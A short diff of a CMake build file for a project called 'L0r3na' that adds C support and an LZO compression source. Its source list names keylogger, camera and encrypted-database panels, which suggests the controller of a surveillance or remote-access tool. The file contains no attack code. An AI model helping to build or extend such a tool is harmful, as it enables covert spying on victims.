@@ -1,6 +1,6 @@
 cmake_minimum_required(VERSION 3.14 FATAL_ERROR)
 
-project(L0r3na LANGUAGES CXX)
+project(L0r3na LANGUAGES CXX C)
 
 include(FetchContent)
 
@@ -39,7 +39,8 @@ set(SRCS main.cpp
          panel_keylogger.cpp
          panel_camara.cpp
          frame_crypt_db.cpp
-         aes256/aes256.cpp)
+         aes256/aes256.cpp
+         lzo/minilzo.c)
 
 add_executable(main WIN32 ${SRCS})
 target_link_libraries(main PRIVATE wxcore wxpng wxnet wxaui wxhtml winmm winsqlite3)
